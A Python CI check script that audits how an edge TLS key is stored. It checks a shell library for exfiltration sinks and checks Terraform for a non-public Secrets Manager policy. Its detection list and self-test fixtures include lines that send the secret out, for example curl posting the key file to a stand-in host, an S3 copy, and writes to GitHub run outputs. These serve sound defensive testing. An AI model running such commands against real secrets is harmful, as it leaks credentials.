#!/usr/bin/env python3
"""check-edge-cert-store.py — the edge TLS key is stored only in the env's
Secrets Manager secret, and that secret is never public (row 9 of the drill
path audit).

What fails, keyed by content:

  1. scripts/lib/edge-cert.sh sends the certificate anywhere but
     `aws secretsmanager put-secret-value --secret-string file://...`: an
     `aws s3` call, `gh`, `curl`, a write to GITHUB_STEP_SUMMARY or
     GITHUB_OUTPUT, a ConfigMap, or an echo/printf of tls.key.
  2. substrate/gibson-bootstrap/edge-cert.tf has no
     `block_public_policy = true`, no Deny statement for every other
     principal, a Deny that does not deny GetSecretValue under a condition
     on aws:PrincipalArn that names role ARNs, or an Allow statement whose
     principal is "*".

Each rule has its own failing fixture in the self-test.

Usage:  scripts/check-edge-cert-store.py [--selftest]
Exit:   0 clean, 1 a rule is broken, 2 the self-test is broken or a file is missing
"""
from __future__ import annotations

import pathlib
import re
import sys

ROOT = pathlib.Path(__file__).resolve().parent.parent
LIB = ROOT / "scripts" / "lib" / "edge-cert.sh"
TF = ROOT / "substrate" / "gibson-bootstrap" / "edge-cert.tf"

SINKS = [
    (r"\baws\s+s3(api)?\b", "an S3 call"),
    (r"(^|[\s;(|])gh\s", "the gh CLI"),
    (r"(^|[\s;(|])curl\s", "curl"),
    (r"GITHUB_STEP_SUMMARY|GITHUB_OUTPUT", "a GitHub run output"),
    (r"configmap", "a ConfigMap"),
    (r"(echo|printf)[^\n]*tls\.key", "a print of tls.key"),
]


def lib_findings(text: str) -> list[str]:
    code = "\n".join(l for l in text.splitlines() if not l.lstrip().startswith("#"))
    out = [f"edge-cert.sh sends the certificate to {what}" for rx, what in SINKS if re.search(rx, code, re.I)]
    if "put-secret-value" not in code or "file://" not in code:
        out.append("edge-cert.sh does not store through `aws secretsmanager put-secret-value --secret-string file://`")
    return out


def statements(code: str) -> list[str]:
    """The body of each top-level `statement { ... }` block, by brace depth."""
    out = []
    for m in re.finditer(r"\bstatement\s*\{", code):
        depth, i = 1, m.end()
        while depth and i < len(code):
            depth += {"{": 1, "}": -1}.get(code[i], 0)
            i += 1
        out.append(code[m.end():i - 1])
    return out


def tf_findings(text: str) -> list[str]:
    code = "\n".join(l.split("#", 1)[0] for l in text.splitlines())
    out = []
    if not re.search(r"block_public_policy\s*=\s*true", code):
        out.append("edge-cert.tf does not set block_public_policy = true")
    sts = statements(code)
    every = r'identifiers\s*=\s*\["\*"\]'
    denies = [st for st in sts if re.search(r'effect\s*=\s*"Deny"', st) and re.search(every, st)]
    if not denies:
        out.append("edge-cert.tf has no Deny for every other principal")
    elif not any("secretsmanager:GetSecretValue" in st
                 and re.search(r'test\s*=\s*"(StringNotEquals|ArnNotEquals|ArnNotLike|StringNotLike)"', st)
                 and re.search(r'variable\s*=\s*"aws:PrincipalArn"', st)
                 and re.search(r"values\s*=\s*\[[^\]]*\barn\b", st)
                 for st in denies):
        out.append("edge-cert.tf has a Deny for every principal, but it does not deny GetSecretValue to every "
                   "principal ARN that is not a named role (a condition on aws:PrincipalArn)")
    for st in sts:
        if re.search(r'effect\s*=\s*"Allow"', st) and re.search(every, st):
            out.append("edge-cert.tf allows every principal (\"*\")")
    return out


ALLOW = ('statement {\n    effect = "Allow"\n    actions = ["secretsmanager:GetSecretValue"]\n'
         '    principals {\n      identifiers = [aws_iam_role.x.arn]\n    }\n  }\n')
DENY = ('statement {\n    effect = "Deny"\n    actions = ["secretsmanager:GetSecretValue", "secretsmanager:PutSecretValue"]\n'
        '    principals {\n      type = "*"\n      identifiers = ["*"]\n    }\n'
        '    condition {\n      test = "StringNotEquals"\n      variable = "aws:PrincipalArn"\n'
        '      values = [for r in data.aws_iam_role.x : r.arn]\n    }\n  }\n')
GOOD_TF = ALLOW + DENY + "block_public_policy = true\n"
GOOD_LIB = 'aws secretsmanager put-secret-value --secret-id "$S" --secret-string "file://$d/value.json"\n'

# Each bad fixture breaks ONE rule, and names the finding it must raise, so a
# rule that stops working fails the self-test even when another rule holds.
BAD_LIBS = [
    (GOOD_LIB + 'aws s3 cp "$d/value.json" s3://bucket/x\n', "an S3 call"),
    (GOOD_LIB + 'gh secret set EDGE < "$d/value.json"\n', "the gh CLI"),
    (GOOD_LIB + 'curl -d @"$d/value.json" https://example.test\n', "curl"),
    (GOOD_LIB + 'cat "$d/value.json" >> "$GITHUB_STEP_SUMMARY"\n', "a GitHub run output"),
    (GOOD_LIB + 'kubectl create configmap x --from-file="$d/value.json"\n', "a ConfigMap"),
    (GOOD_LIB + 'echo "tls.key=$k"\n', "a print of tls.key"),
    ('aws secretsmanager put-secret-value --secret-id "$S" --secret-string "$v"\n', "does not store through"),
]
BAD_TFS = [
    (GOOD_TF.replace("block_public_policy = true", "block_public_policy = false"), "block_public_policy"),
    (ALLOW + "block_public_policy = true\n", "has no Deny for every other principal"),
    (ALLOW + DENY.replace('    condition {\n      test = "StringNotEquals"\n      variable = "aws:PrincipalArn"\n'
                          '      values = [for r in data.aws_iam_role.x : r.arn]\n    }\n', "")
     + "block_public_policy = true\n", "a condition on aws:PrincipalArn"),
    (ALLOW + DENY.replace("[for r in data.aws_iam_role.x : r.arn]", '["x"]') + "block_public_policy = true\n",
     "a condition on aws:PrincipalArn"),
    (ALLOW.replace("[aws_iam_role.x.arn]", '["*"]') + DENY + "block_public_policy = true\n",
     "allows every principal"),
]


def selftest() -> int:
    if lib_findings(GOOD_LIB) or tf_findings(GOOD_TF):
        print("check-edge-cert-store: selftest: the good fixtures failed", lib_findings(GOOD_LIB), tf_findings(GOOD_TF), file=sys.stderr)
        return 2
    for bad, want in BAD_LIBS:
        got = lib_findings(bad)
        if not any(want in g for g in got):
            print(f"check-edge-cert-store: selftest: {bad!r} did not raise {want!r}: {got}", file=sys.stderr)
            return 2
    for bad, want in BAD_TFS:
        got = tf_findings(bad)
        if not any(want in g for g in got):
            print(f"check-edge-cert-store: selftest: a policy fixture did not raise {want!r}: {got}", file=sys.stderr)
            return 2
    print(f"✅ self-test: {len(BAD_LIBS)} sink fixtures and {len(BAD_TFS)} policy fixtures each raise their own finding")
    return 0


def main() -> int:
    if "--selftest" in sys.argv[1:]:
        return selftest()
    if not LIB.is_file() or not TF.is_file():
        print(f"check-edge-cert-store: {LIB} or {TF} is missing", file=sys.stderr)
        return 2
    got = lib_findings(LIB.read_text(encoding="utf-8")) + tf_findings(TF.read_text(encoding="utf-8"))
    if got:
        for g in got:
            print(f"check-edge-cert-store: {g}", file=sys.stderr)
        return 1
    print("✅ the edge TLS key is stored only in the env's Secrets Manager secret, and that secret is never public")
    return 0


if __name__ == "__main__":
    sys.exit(main())
